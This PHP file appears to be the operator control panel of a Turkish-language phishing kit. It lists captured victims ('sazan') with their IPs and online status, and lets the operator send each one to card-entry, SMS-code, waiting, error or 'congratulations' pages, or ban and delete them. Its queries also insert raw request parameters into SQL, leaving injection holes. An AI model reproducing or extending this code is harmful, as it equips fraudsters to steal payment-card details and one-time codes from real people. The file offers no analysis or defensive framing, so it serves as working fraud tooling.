<?php
session_start();
include '../connect.php';
if(!isset($_SESSION["login"])){
header('Location:login.php');
}else{
$sazan=$db->query('SELECT * FROM sazan ORDER BY id DESC')->fetchAll();
if (isset($_GET['time'])) {
	echo time();
}elseif (isset($_GET['online'])) {
 $onlineList = [];
   $query = $db->query("SELECT * FROM sazan", PDO::FETCH_ASSOC);
   if($query->rowCount()) {
	   foreach($query as $v) {
		   if(time()-$v['lastOnline']<20) {
			   array_push($onlineList, $v['ip']);
		   }
	   }
   }
   echo count($onlineList);
}elseif(isset($_GET['logout'])){
	session_unset();
	session_destroy();
	header('Location:login.php');
}elseif(isset($_GET['sil'])){
	$sil = $_GET['sil'];
	$db->query("DELETE FROM sazan WHERE id='$sil'");
}elseif(isset($_GET['ban'])){
	$ban = $_GET['ban'];
	$db->query("UPDATE sazan SET ban='1' WHERE id ='{$ban}'");
	echo "Sazan banlandı!";
}elseif(isset($_GET['dondur'])){
	$dondur = $_GET['dondur'];
	$db->query("UPDATE sazan SET go='1' WHERE id ='{$dondur}'");
	echo "Kullanıcı Sayfanın başına gönderildi!";
}elseif(isset($_GET['sms'])){
	$sms = $_GET['sms'];
	$db->query("UPDATE sazan SET go='6' WHERE id ='{$sms}'");
	echo "Sms Sayfasına gönderildi!";
}elseif(isset($_GET['tebrik'])){
	$tebrik = $_GET['tebrik'];
	$db->query("UPDATE sazan SET go='5' WHERE id ='{$tebrik}'");
	echo "Tebrik Sayfasına gönderildi!";
}elseif(isset($_GET['hata'])){
	$hata = $_GET['hata'];
	$db->query("UPDATE sazan SET go='4' WHERE id ='{$hata}'");
	echo "Hata Sayfasına gönderildi!";
}elseif(isset($_GET['bekle'])){
	$bekle = $_GET['bekle'];
	$db->query("UPDATE sazan SET go='3' WHERE id ='{$bekle}'");
	echo "Bekleme Sayfasına gönderildi!";
}elseif(isset($_GET['kart'])){
	$kart = $_GET['kart'];
	$db->query("UPDATE sazan SET go='2' WHERE id ='{$kart}'");
	echo "Kart Sayfasına gönderildi!";
}elseif(isset($_GET['ozel'])){
	$kart = $_GET['ozel'];
	$db->query("UPDATE sazan SET go='7' WHERE id ='{$kart}'");
	echo "Özel Sayfaya gönderildi!";
}elseif(isset($_GET['bankaldir'])){
	$db->query("UPDATE sazan SET ban='0'");
	echo "Tüm banlar kaldırıldı!";
}elseif(isset($_GET['tumu'])){
	$db->query("DELETE FROM sazan");
	echo "Tüm Sazanlar silindi!";
}elseif(isset($_GET['sifre'])){
	$adi = $_POST['adi'];
	$pass = $_POST['pass'];
	$privpage = $_POST['privpage'];
	$tebrik = $_POST['tebrik'];
	$hata = $_POST['hata'];
	$son=$db->prepare("UPDATE site SET adi=?,pass=?,privpage=?,tebrik=?,hata=? WHERE id = '1'");
	$son->execute(array($adi,$pass,$privpage,$tebrik,$hata));
	header("Location:index.php");
}elseif(isset($_GET['sound'])){
foreach($db->query('SELECT * FROM sazan') as $sazan){
    if($sazan['sound']=='1'){
       echo "1";
   $db->query("UPDATE sazan SET sound='0'");
    }
}

}else{
	echo json_encode($sazan);
}
}
?>